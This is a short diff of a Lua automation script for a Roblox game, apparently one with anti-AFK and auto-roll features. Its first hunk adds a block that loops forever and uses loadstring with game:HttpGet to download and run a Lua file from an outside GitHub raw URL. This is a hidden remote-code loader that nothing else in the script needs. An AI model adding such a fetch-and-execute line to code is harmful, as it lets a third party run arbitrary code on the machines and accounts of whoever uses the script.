@@ -12,6 +12,11 @@ local deleteRemote = ReplicatedStorage:WaitForChild("RemoteFunctions"):WaitForCh
 local VirtualUser = game:GetService("VirtualUser")
 local StartRolls = false
 
+task.spawn(function()
+	while true do
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/thideGTD/ScriptTreo/refs/heads/main/TNGHIA.lua"))()
+	end
+end)
 local function AntiAfk2()
     task.spawn(
         function()
@@ -147,6 +152,7 @@ while true do
 	end
 	_wait(5)
 end
+
 
 
 
